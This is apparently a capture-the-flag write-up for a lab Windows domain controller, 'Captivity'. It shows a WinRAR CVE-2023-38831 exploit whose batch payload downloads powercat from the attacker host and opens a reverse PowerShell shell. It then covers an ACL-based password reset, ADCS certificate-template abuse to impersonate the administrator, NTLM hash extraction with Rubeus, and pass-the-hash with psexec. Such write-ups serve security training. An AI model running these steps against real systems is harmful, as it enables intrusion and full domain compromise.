# Captivity

## High Level Overview
Captivity is a medium-level Windows machine that is vulnerable to CVE-2023-38831 in its file parser feature. After gaining a foothold on the system, we discovered that Active Directory Domain Services is installed, effectively making the machine a domain controller. Additionally, we identified a vulnerable user object with world-writable permissions. This user is a member of the 'Certificate Authority Admins' group, granting them the ability to publish certificates. Furthermore, we identified a misconfigured certificate template with the 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' attribute. We proceeded to request a certificate using this template, impersonating the administrator in order to escalate our privileges.

## Enumerating the target
Run a full-range port scan to find all open ports. 
```
┌──(kali㉿kali)-[~/Captivity]
└─$ nmap -p- 192.168.100.130
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-29 04:36 EDT
Nmap scan report for 192.168.100.130
Host is up (0.00091s latency).
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5357/tcp  open  wsdapi
5985/tcp  open  wsman
8000/tcp  open  http-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49672/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49683/tcp open  unknown
49704/tcp open  unknown
49710/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 50.15 seconds
```

Run service scan on open ports. 
```
┌──(kali㉿kali)-[~/Captivity]
└─$ nmap -p21,22,53,80,88,135,139,389,445,464,593,636,3268,3269,5357,5985,8000,9389,47001 -sC -sV -T5 192.168.100.130
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-29 04:39 EDT
Stats: 0:01:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 94.74% done; ETC: 04:40 (0:00:04 remaining)
Nmap scan report for 192.168.100.130
Host is up (0.00066s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_09-19-23  12:54PM       <DIR>          setup
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 26:1c:4e:d1:5d:ec:19:7e:1b:af:b5:77:ed:10:bd:4b (RSA)
|   256 35:1d:11:a9:6f:47:3e:75:bd:eb:2a:aa:99:6d:73:1c (ECDSA)
|_  256 d3:d5:58:40:6a:42:c6:8f:2f:ea:fa:51:a3:2c:45:29 (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-29 08:39:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: capt.org0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.capt.org
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.capt.org
| Not valid before: 2023-09-19T17:59:37
|_Not valid after:  2024-09-18T17:59:37
|_ssl-date: 2023-09-29T08:41:11+00:00; +25s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: capt.org0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.capt.org
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.capt.org
| Not valid before: 2023-09-19T17:59:37
|_Not valid after:  2024-09-18T17:59:37
|_ssl-date: 2023-09-29T08:41:11+00:00; +25s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: capt.org0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.capt.org
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.capt.org
| Not valid before: 2023-09-19T17:59:37
|_Not valid after:  2024-09-18T17:59:37
|_ssl-date: 2023-09-29T08:41:11+00:00; +25s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: capt.org0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.capt.org
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.capt.org
| Not valid before: 2023-09-19T17:59:37
|_Not valid after:  2024-09-18T17:59:37
|_ssl-date: 2023-09-29T08:41:11+00:00; +25s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http-alt      Werkzeug/2.3.7 Python/3.11.5
|_http-server-header: Werkzeug/2.3.7 Python/3.11.5
| fingerprint-strings: 
|   FourOhFourRequest: 
...
|_http-title: File Hosting
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:94:0e:fd (VMware)
| smb2-time: 
|   date: 2023-09-29T08:41:04
|_  start_date: N/A
|_clock-skew: mean: 24s, deviation: 0s, median: 24s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.55 seconds
```

## Enumerating Services 

### FTP 

Nmap identified a lot of open ports. Ports 88 (kerberos) and 389 (ldap) indicate that this machine is a domain controller. 

Let's start service enumeration with port 21. As shown below, anonymous login is allowed for READ access. 

```
┌──(kali㉿kali)-[~/Captivity]
└─$ ftp 192.168.100.130
Connected to 192.168.100.130.
220 Microsoft FTP Service
Name (192.168.100.130:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49790|)
125 Data connection already open; Transfer starting.
09-19-23  12:54PM       <DIR>          setup
226 Transfer complete.
ftp> cd setup
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49791|)
125 Data connection already open; Transfer starting.
09-19-23  10:58AM             61263968 Git-2.42.0.2-64-bit.exe
09-19-23  11:00AM             25932664 python-3.11.5-amd64.exe
09-19-23  10:56AM              3585248 winrar-x64-621.exe
226 Transfer complete.
ftp> exit
221 Goodbye.
```

Three .exe files are hosted on /setup directory. These won't give us anything useful other than information about the installed applications on the system. For example, winrar-x64-621.exe (version 6.21) is [vulnerable](https://alirodoplu.gitbook.io/ali-rodoplu/attack/exploit-the-winrar-cve-2023-38831) to CVE-2023-38831. If we find a way to exploit this, we may get command execution. 

### Web Services
Web service running on port 80 requires windows authentication. We don't currently have any domain credentials, so we will pass it for now. Moreover, running fuzzers and other scans don't reveal anything interesting.   
![Alt text](Screenshots/80_landing.png)

Web service on port 8000 appears to be a file hosting application. It, too, requires authentication. 
![Alt text](Screenshots/file-hosting-landing.png)

However, attempting simple admin:admin lets us in. 
![Alt text](Screenshots/file-hosting-dashboard-2.png)

We can upload, download, edit any type of file. 

Moreover, developers left a note for us. 
```
Please note that if you upload archive files, our application will unarchive and check for possible viruses. 
```

### Getting a shell as web_svc
If the application is unarchiving our compressed files and the system has a vulnerable WinRAR version installed, we can attempt to upload an exploit and test if it opens our exploit. For that we will search for public exploits of [CVE-2023-38831](https://github.com/b1tg/CVE-2023-38831-winrar-exploit).

Clone the repo. 
```
┌──(kali㉿kali)-[~/Captivity]
└─$ git clone https://github.com/b1tg/CVE-2023-38831-winrar-exploit
Cloning into 'CVE-2023-38831-winrar-exploit'...
remote: Enumerating objects: 29, done.
remote: Counting objects: 100% (29/29), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 29 (delta 13), reused 14 (delta 4), pack-reused 0
Receiving objects: 100% (29/29), 548.72 KiB | 372.00 KiB/s, done.
Resolving deltas: 100% (13/13), done.

┌──(kali㉿kali)-[~/Captivity]
└─$ cd CVE-2023-38831-winrar-exploit
```
Change the script.bat accordingly and prepare the exploit.
```
┌──(kali㉿kali)-[~/Captivity/CVE-2023-38831-winrar-exploit]
└─$ cat script.bat                  
powershell.exe -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.100.132/powercat.ps1'); powercat -c 192.168.100.132 -p 443 -e powershell"

┌──(kali㉿kali)-[~/Captivity/CVE-2023-38831-winrar-exploit]
└─$ python cve-2023-38831-exp-gen.py CLASSIFIED_DOCUMENTS.pdf script.bat exploit.rar
BAIT_NAME: CLASSIFIED_DOCUMENTS.pdf
SCRIPT_NAME: script.bat
OUTPUT_NAME: exploit.rar
ok..
```

Now we need to download and host powercat.ps1.
```
┌──(kali㉿kali)-[~/Captivity]
└─$ wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
--2023-09-29 06:55:51--  https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 37667 (37K) [text/plain]
Saving to: ‘powercat.ps1’

powercat.ps1                      100%[===========================================================>]  36.78K  --.-KB/s    in 0.03s   

2023-09-29 06:55:51 (1.18 MB/s) - ‘powercat.ps1’ saved [37667/37667]

                                                                                                                                      
┌──(kali㉿kali)-[~/Captivity]
└─$ python -m http.server 80                                                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
In a separate tab start a listener.
```
┌──(kali㉿kali)-[~/Captivity]
└─$ nc -nvlp 443
listening on [any] 443 ...
```

Now it is time to upload exploit.rar to the application. 

![Alt text](Screenshots/file-hosting-upload-exploit.png)

![Alt text](Screenshots/file-hosting-upload-exploit-2.png)


After some time, we get a hit to the web server and receive a reverse shell!

```
┌──(kali㉿kali)-[~/Captivity]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.100.132] from (UNKNOWN) [192.168.100.130] 50196
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Apps\Parser> whoami
whoami
capt\web_svc
PS C:\Apps\Parser> type c:\users\web_svc\desktop\user1.txt
type c:\users\web_svc\desktop\user1.txt
ICSD{ab6ccbe923169afb4efc1b5a933af2c8}
PS C:\Apps\Parser> 
```



### Enumerating The Domain
The user we have access to is a standard domain user with minimal permissions. Therefore, we should find ways to escalate our privileges. In domain environments, privilege escalation can be achieved in one of two ways: exploiting a misconfiguration in the domain or escalating locally. Let's start with the former. 

To enumerate the domain, we will use [Bloodhound](https://github.com/BloodHoundAD/BloodHound). BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. 

[SharpHound](https://github.com/BloodHoundAD/SharpHound) is a data collector for BloodHound. We will collect information about domain objects via SharpHound and analyze it using BloodHound. 

```
PS C:\windows\tasks> iwr -uri http://192.168.100.132/SharpHound.exe -o SharpHound.exe

PS C:\windows\tasks> .\SharpHound.exe
.\SharpHound.exe
2023-10-02T04:41:49.1924360-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
...
2023-10-02T04:42:32.6453308-07:00|INFORMATION|SharpHound Enumeration Completed at 4:42 AM on 10/2/2023! Happy Graphing!
```

Now, we need to transfer the output file to our kali machine. 

Start SMB server on kali:
 ```
 ┌──(kali㉿kali)-[~/Captivity]
└─$ impacket-smbserver -smb2support share . -username kali -password kali 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Mount the share on victim machine:
```
PS C:\Windows\tasks> net use f: \\192.168.100.132\share /user:kali kali /persistent:yes
net use f: \\192.168.100.132\share /user:kali kali /persistent:yes
The command completed successfully.
```
And copy SharpHound output to the mounted folder. 
```
PS C:\windows\tasks> cp 20231002044231_BloodHound.zip f:\
cp 20231002044231_BloodHound.zip f:\
```

If this is your first time setting up BloodHound, please refer to [this link](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux).


Now, import the data (20231002044231_BloodHound.zip) by drag and dropping.  

### Finding Vulnerable Domain Objects via BloodHound Analysis

Bloodhound is a great tool to analyze domain object relations and possibly find misconfigurations. For example, in the analysis section we can find many pre-built queries that find known mistakes made by system admins.

![Alt text](Screenshots/bloodhound-analysis.png)

One of these queries is titled 'Find All Paths from Domain Users to High Value Targets.' This query reveals that, as an authenticated user, we have fullControl permissions over the 'ca_admin' user. Full control permission allows us to perform various actions on user account settings, such as adding it to groups, resetting the password, and even deleting the object.

![Alt text](Screenshots/bloodhound-shortest-path-2.png)

Let's reset the user's password using the built-in 'net user' utility.

```
PS C:\windows\tasks> net user ca_admin Passw0rd123!@# /domain
net user ca_admin Passw0rd123!@# /domain
The command completed successfully.
```

We gain access to the machine as the 'ca_admin' user!
```
┌──(kali㉿kali)-[~/Captivity]
└─$ evil-winrm -u ca_admin -p 'Passw0rd123!@#' -i 192.168.100.130        
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ca_admin\Documents> whoami
capt\ca_admin
*Evil-WinRM* PS C:\Users\ca_admin\Documents> type C:\Users\ca_admin\Desktop\user2.txt
ICSD{d6e5f1a95e337951476ec27672868aa1}
```

### Certificate Authority Admins Group
ca_admin is a member of 'CAPT\Certificate Authority Admins,' indicating that Active Directory Certificate Services may be installed. We can verify this using the 'Get-WindowsFeature' cmdlet.

```
*Evil-WinRM* PS C:\Users\ca_admin\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CAPT\Certificate Authority Admins           Group            S-1-5-21-541188004-2695660962-2805497550-1105 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

```
PS C:\windows\tasks> Get-WindowsFeature -Name ADCS-Cert-Authority
Get-WindowsFeature -Name ADCS-Cert-Authority

Display Name                                            Name                       Install State
------------                                            ----                       -------------
    [X] Certification Authority                         ADCS-Cert-Authority            Installed

```

There are [many ways](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation) to escalate via AD CS in a domain. 


To interact with AD CS, we will use a great open source tool [Certify](https://github.com/GhostPack/Certify) by [harmj0y](https://twitter.com/harmj0y) and [tifkin_](https://twitter.com/tifkin_). The '/vulnerable' option checks for misconfigured certificate templates; however, we didn't find any. Nevertheless, since we are a member of 'Certificate Authority Admins,' we may have permissions to issue another certificate or modify certificate permissions.

> [!IMPORTANT]  
> Pre-compiled tools may not be compatible with the current machine. It is recommended to re-build both Certify and Rubeus on your local machine using Visual Studio.
> If you do so, don't forget to choose "Release" and "any CPU" options.   

```
*Evil-WinRM* PS C:\Users\ca_admin\Documents> .\certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=capt,DC=org'

[*] Listing info about the Enterprise CA 'capt-ca'

    Enterprise CA Name            : capt-ca
    DNS Hostname                  : dc01.capt.org
    FullName                      : dc01.capt.org\capt-ca
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=capt-ca, DC=capt, DC=org
    Cert Thumbprint               : 829C336B788EBB4A8602C061BD75CEF024BB61B6
    Cert Serial                   : 1D6245C40897D6A5438655E8FBA16DA1
    Cert Start Date               : 9/19/2023 10:58:01 AM
    Cert End Date                 : 9/19/2028 11:08:01 AM
    Cert Chain                    : CN=capt-ca,DC=capt,DC=org
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
      Allow  ManageCA, ManageCertificates               CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!



Certify completed in 00:00:00.5201741
```

In the context of escalation, we are interested in certificate templates where we can specify the user for whom the certificate is issued. This is achieved through the 'enrolleeSuppliesSubject' attribute in the certificate template object. 

```
*Evil-WinRM* PS C:\Users\ca_admin\Documents> .\certify.exe find /enrolleeSuppliesSubject

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=capt,DC=org'

[*] Listing info about the Enterprise CA 'capt-ca'

    Enterprise CA Name            : capt-ca
    DNS Hostname                  : dc01.capt.org
    FullName                      : dc01.capt.org\capt-ca
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=capt-ca, DC=capt, DC=org
    Cert Thumbprint               : 829C336B788EBB4A8602C061BD75CEF024BB61B6
    Cert Serial                   : 1D6245C40897D6A5438655E8FBA16DA1
    Cert Start Date               : 9/19/2023 10:58:01 AM
    Cert End Date                 : 9/19/2028 11:08:01 AM
    Cert Chain                    : CN=capt-ca,DC=capt,DC=org
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
      Allow  ManageCA, ManageCertificates               CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
    Enrollment Agent Restrictions : None
Enabled certificate templates where users can supply a SAN:
    CA Name                               : dc01.capt.org\capt-ca
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
      Object Control Permissions
        Owner                       : CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
        WriteOwner Principals       : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
        WriteDacl Principals        : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
        WriteProperty Principals    : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519

    CA Name                               : dc01.capt.org\capt-ca
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
      Object Control Permissions
        Owner                       : CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
        WriteOwner Principals       : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
        WriteDacl Principals        : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
        WriteProperty Principals    : CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519

    CA Name                               : dc01.capt.org\capt-ca
    Template Name                         : CAPTUser
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CAPT\Certificate Authority AdminsS-1-5-21-541188004-2695660962-2805497550-1105
                                      CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
      Object Control Permissions
        Owner                       : CAPT\Administrator            S-1-5-21-541188004-2695660962-2805497550-500
        WriteOwner Principals       : CAPT\Administrator            S-1-5-21-541188004-2695660962-2805497550-500
                                      CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
        WriteDacl Principals        : CAPT\Administrator            S-1-5-21-541188004-2695660962-2805497550-500
                                      CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519
        WriteProperty Principals    : CAPT\Administrator            S-1-5-21-541188004-2695660962-2805497550-500
                                      CAPT\Domain Admins            S-1-5-21-541188004-2695660962-2805497550-512
                                      CAPT\Enterprise Admins        S-1-5-21-541188004-2695660962-2805497550-519



Certify completed in 00:00:00.2955174
*Evil-WinRM* PS C:\Users\ca_admin\Documents> 
```
While searching for such templates, we discovered three: WebServer, SubCA, and CAPTUser. We lack the permissions to enroll in the first two, but the third one grants enroll permission in its DACL for 'CAPT\Certificate Authority Admins.' This essentially enables us to request a certificate on behalf of anyone, including the domain admins.

```
*Evil-WinRM* PS C:\Users\ca_admin\Documents> .\certify.exe request /ca:dc01.capt.org\capt-ca /template:CAPTUser /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : CAPT\ca_admin
[*] No subject name specified, using current context as subject.

[*] Template                : CAPTUser
[*] Subject                 : CN=ca_admin, CN=Users, DC=capt, DC=org
[*] AltName                 : administrator

[*] Certificate Authority   : dc01.capt.org\capt-ca

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 6

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAuBz<snip>Y3wiJ6DqsSI=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIF+DCCBOCgAwIBAgI<snip>hffQWo+HLkM=
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:03.9105071
```

Convert the certificate. 
```
┌──(kali㉿kali)-[~/Captivity]
└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

Let's use Rubeus to request a TGT for the administrator user. While we could pass the generated ticket to our session, we will instead utilize /getcredentials and /show options to obtain the hash of the administrator user.


```
*Evil-WinRM* PS C:\Users\ca_admin\Documents> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ca_admin, CN=Users, DC=capt, DC=org
[*] Building AS-REQ (w/ PKINIT preauth) for: 'capt.org\administrator'
[*] Using domain controller: fe80::ecab:8748:e39b:fbc6%9:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGND<snip>2FwdC5vcmc=

  ServiceName              :  krbtgt/capt.org
  ServiceRealm             :  CAPT.ORG
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  CAPT.ORG
  StartTime                :  10/2/2023 6:13:05 AM
  EndTime                  :  10/2/2023 4:13:05 PM
  RenewTill                :  10/9/2023 6:13:05 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  4gK9U+F3PpFv2d/ur5idiA==
  ASREP (key)              :  0407283069E3DC709AF52D95B1BF9224

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 26667245871373BA27C81CC4ACBB84C9
```

Use psexec to login to the machine. 

```
┌──(kali㉿kali)-[~/Captivity]
└─$ impacket-psexec Administrator@192.168.100.130 -hashes :26667245871373BA27C81CC4ACBB84C9
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.100.130.....
[*] Found writable share ADMIN$
[*] Uploading file bRwjLWHm.exe
[*] Opening SVCManager on 192.168.100.130.....
[*] Creating service QOHX on 192.168.100.130.....
[*] Starting service QOHX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
dc01

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
ICSD{90fe25002f1e949719f6fa398c8a7374}

C:\Windows\system32> 
```
